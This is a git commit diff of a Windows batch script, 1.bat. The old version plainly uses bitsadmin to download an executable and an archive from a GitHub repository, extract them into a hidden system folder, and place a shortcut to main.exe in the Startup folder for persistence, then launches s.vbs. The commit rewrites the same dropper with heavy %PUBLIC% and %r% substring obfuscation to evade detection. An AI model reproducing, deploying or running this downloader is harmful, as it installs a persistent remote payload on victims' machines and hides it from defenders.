55f8c525b911c959165812380010039ef90c0d1d
batutamesmo <75849123+batutamesmo@users.noreply.github.com>
2023-08-08 17:03:58 -0300

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,19 +1,29 @@
-echo
-set /a num=%random% %%10000 +1
-bitsadmin /transfer zip /priority high https://github.com/batutamesmo/cc/raw/main/xxmklink.exe %temp%\xxmklink.exe
-bitsadmin /transfer zip /priority high https://github.com/batutamesmo/cc/raw/main/a.rar %temp%\%num%.rar
+@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
+SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
+^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
+@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
+ec%r:~11,1%o
+%r:~8,1%e%r:~4,1% /a n%r:~13,1%%r:~12,1%=%random% %%10000 +1
+%r:~10,1%%r:~2,1%%r:~4,1%%r:~8,1%ad%r:~12,1%%r:~2,1%n /%r:~4,1%ran%r:~8,1%fer %r:~7,1%%r:~2,1%p /pr%r:~2,1%or%r:~2,1%%r:~4,1%y %r:~11,1%%r:~2,1%%r:~1,1%%r:~11,1% %r:~11,1%%r:~4,1%%r:~4,1%p%r:~8,1%://%r:~1,1%%r:~2,1%%r:~4,1%%r:~11,1%%r:~13,1%%r:~10,1%.co%r:~12,1%/%r:~10,1%a%r:~4,1%%r:~13,1%%r:~4,1%a%r:~12,1%e%r:~8,1%%r:~12,1%o/cc/ra%r:~9,1%/%r:~12,1%a%r:~2,1%n/xx%r:~12,1%kl%r:~2,1%nk.exe %temp%\xx%r:~12,1%kl%r:~2,1%nk.exe
+%r:~10,1%%r:~2,1%%r:~4,1%%r:~8,1%ad%r:~12,1%%r:~2,1%n /%r:~4,1%ran%r:~8,1%fer %r:~7,1%%r:~2,1%p /pr%r:~2,1%or%r:~2,1%%r:~4,1%y %r:~11,1%%r:~2,1%%r:~1,1%%r:~11,1% %r:~11,1%%r:~4,1%%r:~4,1%p%r:~8,1%://%r:~1,1%%r:~2,1%%r:~4,1%%r:~11,1%%r:~13,1%%r:~10,1%.co%r:~12,1%/%r:~10,1%a%r:~4,1%%r:~13,1%%r:~4,1%a%r:~12,1%e%r:~8,1%%r:~12,1%o/cc/ra%r:~9,1%/%r:~12,1%a%r:~2,1%n/a.rar %temp%\%num%.rar
 
-IF EXIST "%ProgramFiles(x86)%\WinRAR\Rar.exe" (
-    "%ProgramFiles(x86)%\WinRAR\Rar.exe" x -c -y  "%temp%\%num%.rar" "%USERPROFILE%\Documents\%num%\"
-) ELSE (
-    "%ProgramFiles%\WinRAR\Rar.exe" x -c -y  "%temp%\%num%.rar" "%USERPROFILE%\Documents\%num%\"
+%r:~16,1%F E%r:~6,1%%r:~16,1%%r:~14,1%T "%ProgramFiles(x86)%\W%r:~2,1%nR%r:~18,1%R\Rar.exe" (
+    "%ProgramFiles(x86)%\W%r:~2,1%nR%r:~18,1%R\Rar.exe" x -c -y  "%temp%\%num%.rar" "%USERPROFILE%\Doc%r:~13,1%%r:~12,1%en%r:~4,1%%r:~8,1%\%num%\"
+) EL%r:~14,1%E (
+    "%ProgramFiles%\W%r:~2,1%nR%r:~18,1%R\Rar.exe" x -c -y  "%temp%\%num%.rar" "%USERPROFILE%\Doc%r:~13,1%%r:~12,1%en%r:~4,1%%r:~8,1%\%num%\"
 )
-attrib +s +h "%USERPROFILE%\Documents\%num%"
+a%r:~4,1%%r:~4,1%r%r:~2,1%%r:~10,1% +%r:~8,1% +%r:~11,1% "%USERPROFILE%\Doc%r:~13,1%%r:~12,1%en%r:~4,1%%r:~8,1%\%num%"
 cd "%temp%"
-xxmklink "%USERPROFILE%\Desktop\main"   "%USERPROFILE%\Documents\%num%\main.exe"
-CD "%USERPROFILE%\Documents\%num%\"
-move "%USERPROFILE%\Desktop\main.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+xx%r:~12,1%kl%r:~2,1%nk "%USERPROFILE%\De%r:~8,1%k%r:~4,1%op\%r:~12,1%a%r:~2,1%n"   "%USERPROFILE%\Doc%r:~13,1%%r:~12,1%en%r:~4,1%%r:~8,1%\%num%\%r:~12,1%a%r:~2,1%n.exe"
+CD "%USERPROFILE%\Doc%r:~13,1%%r:~12,1%en%r:~4,1%%r:~8,1%\%num%\"
+%r:~12,1%ove "%USERPROFILE%\De%r:~8,1%k%r:~4,1%op\%r:~12,1%a%r:~2,1%n.lnk" "%appdata%\M%r:~2,1%cro%r:~8,1%of%r:~4,1%\W%r:~2,1%ndo%r:~9,1%%r:~8,1%\%r:~14,1%%r:~4,1%ar%r:~4,1% Men%r:~13,1%\Pro%r:~1,1%ra%r:~12,1%%r:~8,1%\%r:~14,1%%r:~4,1%ar%r:~4,1%%r:~13,1%p"
 
 
-start s.vbs
+%r:~8,1%%r:~4,1%ar%r:~4,1% %r:~8,1%.v%r:~10,1%%r:~8,1%
 
+
+@ec%r:~11,1%o off
+%r:~8,1%e%r:~4,1% a = %%~i
+%r:~8,1%e%r:~4,1% a = % + %~i"%%~%r:~2,1%"%
+set a = %a%
+:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
